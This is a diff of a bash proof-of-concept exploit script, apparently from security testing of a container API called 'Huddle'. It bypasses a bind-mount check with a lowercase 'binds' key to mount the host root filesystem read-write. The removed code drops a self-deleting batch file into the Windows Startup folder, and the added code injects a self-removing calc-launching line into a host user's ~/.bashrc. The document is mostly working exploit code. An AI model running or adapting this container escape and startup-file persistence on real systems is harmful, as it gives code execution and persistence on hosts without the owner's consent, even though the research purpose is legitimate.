@@ -177,38 +177,40 @@ echo "wrote proof (host) $P"'
   [[ -z "$CID" ]] && refused
   CLEAN_IDS+=("$CID"); echo "[+] created $CID (host / mounted at /host, rw)"; run_and_log "$CID"
   ;;
-# ── Finding #1 (fs): filesystem-only calc pop via lowercase `binds` ───────────
-# No privileged, no pidmode, no nsenter. Mount host rootfs via the 1b-style
-# bypass (lowercase `binds` under properly-cased `HostConfig`), then write a
-# calc.bat to the Windows Startup folder. Explorer runs it on next login cycle
-# (or instantly if shell is watching the folder). Self-cleans after 10s.
+# ── Finding #1 (fs): filesystem-only calc pop via bashrc injection ────────────
+# No privileged, no pidmode, no nsenter, no binfmt_misc. Mount host rootfs via
+# the 1b-style bypass (lowercase `binds` under properly-cased `HostConfig`).
+# Inject a self-removing one-liner into the host user's ~/.bashrc that pops calc
+# via WSL interop (normal user shells have working binfmt + WSL_INTEROP, unlike
+# our nsenter'd container context). Triggers the moment ANY new terminal opens.
 fs)
   pull
   FSPOP='set +e
-echo "[*] host rootfs at /host — looking for Windows users ..."
-STARTUP=""
-for d in /host/mnt/c/Users/*/AppData/Roaming/Microsoft/Windows/Start\ Menu/Programs/Startup; do
-  [ -d "$d" ] && { STARTUP="$d"; break; }
+echo "[*] host rootfs at /host — scanning for user home dirs ..."
+BASHRC=""
+for rc in /host/home/*/.bashrc /host/root/.bashrc; do
+  [ -f "$rc" ] && { BASHRC="$rc"; break; }
 done
-if [ -z "$STARTUP" ]; then
-  echo "[!] no Startup folder found — trying ProgramData"
-  STARTUP="/host/mnt/c/ProgramData/Microsoft/Windows/Start Menu/Programs/Startup"
-  mkdir -p "$STARTUP" 2>/dev/null
+if [ -z "$BASHRC" ]; then
+  echo "[!] no .bashrc found on host"
+  exit 1
 fi
-echo "[+] target: $STARTUP"
-BAT="$STARTUP/huddle-poc.bat"
-cat > "$BAT" << "BATEOF"
-@echo off
-start calc
-del "%~f0"
-BATEOF
-echo "[+] wrote $BAT (self-deleting — launches calc then removes itself)"
+echo "[+] target: $BASHRC"
+# Unique marker for self-removal
+MARKER="HUDDLE_POC_CALCPOP"
+# The injected line: launch calc via cmd.exe interop, then remove itself from
+# bashrc. All in one line so cleanup is atomic. Uses a background subshell so
+# the terminal open is not blocked.
+LINE="# ${MARKER} — PoC injected by Huddle security test (self-removing)"
+PAYLOAD="( cmd.exe /c start calc >/dev/null 2>&1 & ); sed -i \"/${MARKER}/d\" ~/{.bashrc,.profile} 2>/dev/null # ${MARKER}"
+echo "$LINE" >> "$BASHRC"
+echo "$PAYLOAD" >> "$BASHRC"
+echo "[+] injected 2 lines into $BASHRC (self-removing on first trigger)"
 echo "[*] proof: host /etc/hostname = $(cat /host/etc/hostname 2>/dev/null)"
-echo "[*] proof: wrote bat with content:"
-cat "$BAT"
-echo "[*] waiting 10s for Explorer to pick it up, then cleaning ..."
-sleep 10
-rm -f "$BAT" 2>/dev/null && echo "[+] cleaned up $BAT" || echo "[!] cleanup failed (already executed and self-deleted?)"'
+echo "[*] injected content:"
+grep "$MARKER" "$BASHRC"
+echo ""
+echo "[*] calc will pop when any WSL terminal opens. Lines auto-remove after."'
   CID=$(create_raw "huddle-$STAMP" \
     "{\"Image\":\"$IMAGE\",\"Cmd\":$(cmd_json "$FSPOP"),\"HostConfig\":{\"binds\":[\"/:/host\"]}}")
   [[ -z "$CID" ]] && refused
